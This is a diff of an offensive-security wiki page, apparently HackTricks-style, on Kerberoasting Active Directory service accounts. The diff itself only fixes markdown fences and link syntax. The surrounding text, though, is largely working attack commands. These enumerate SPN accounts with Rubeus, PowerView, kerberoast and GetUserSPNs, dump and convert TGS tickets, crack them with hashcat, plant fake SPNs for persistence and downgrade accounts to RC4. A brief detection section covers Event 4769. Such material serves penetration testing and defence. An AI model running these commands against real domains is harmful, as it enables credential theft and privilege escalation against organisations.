@@ -1,6 +1,5 @@
 # Kerberoast
 
-
 ## Kerberoast
 
 Kerberoasting focuses on the acquisition of TGS tickets, specifically those related to services operating under user accounts in Active Directory (AD), excluding computer accounts. The encryption of these tickets utilizes keys that originate from user passwords, allowing for offline credential cracking. The use of a user account as a service is indicated by a non-empty ServicePrincipalName (SPN) property.
@@ -38,14 +37,14 @@ kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o ke
 # 2) Request TGS for selected SPNs and dump
 kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
 ```
-```
+
 Multi-feature tools including kerberoast checks:
 
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
 ```
-```
+
 #### Windows
 
 - Enumerate kerberoastable users
@@ -60,7 +59,7 @@ Get-NetUser -SPN | Select-Object serviceprincipalname
 # Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
 .\Rubeus.exe kerberoast /stats
 ```
-```
+
 - Technique 1: Ask for TGS and dump from memory
 
 ```powershell
@@ -79,7 +78,7 @@ python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
 # Optional: convert john -> hashcat etype23 if needed
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
 ```
-```
+
 - Technique 2: Automatic tools
 
 ```powershell
@@ -95,7 +94,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 # Rubeus — target admins only
 .\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
 ```
-```
+
 > [!WARNING]
 > A TGS request generates Windows Security Event 4769 (A Kerberos service ticket was requested).
 
@@ -121,7 +120,7 @@ Examples (Rubeus):
 # Roast a specific SPN with an existing TGT from a non-domain-joined host
 .\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
 ```
-```
+
 ### Cracking
 
 ```bash
@@ -136,7 +135,7 @@ hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
 # AES256-CTS-HMAC-SHA1-96 (etype 18)
 hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
 ```
-```
+
 ### Persistence / Abuse
 
 If you control or can modify an account, you can make it kerberoastable by adding an SPN:
@@ -144,7 +143,7 @@ If you control or can modify an account, you can make it kerberoastable by addin
 ```powershell
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
 ```
-```
+
 Downgrade an account to enable RC4 for easier cracking (requires write privileges on the target object):
 
 ```powershell
@@ -153,7 +152,7 @@ Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 # Mixed RC4+AES (value 28)
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
-```
+
 You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast
 
 If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:
@@ -183,7 +182,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
   } |
   Select-Object -ExpandProperty Message
 ```
-```
+
 Additional ideas:
 
 - Baseline normal SPN usage per host/user; alert on large bursts of distinct SPN requests from a single principal.
@@ -213,7 +212,7 @@ Linux
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
 ```
-```
+
 Windows
 
 - Rubeus (PR #139):
@@ -221,7 +220,7 @@ Windows
 ```powershell
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
 ```
-```
+
 Related
 
 If you are targeting AS-REP roastable users, see also:
@@ -230,9 +229,9 @@ If you are targeting AS-REP roastable users, see also:
 
 ## References
 
-- [[https://www.tarlogic.com/blog/how-to-attack-kerberos/|https://www.tarlogic.com/blog/how-to-attack-kerberos/]]
-- [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting|https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting]]
-- [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled|https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled]]
+- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 - Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
 - SpecterOps – Rubeus Roasting documentation: https://docs.specterops.io/ghostpack/rubeus/roasting
 
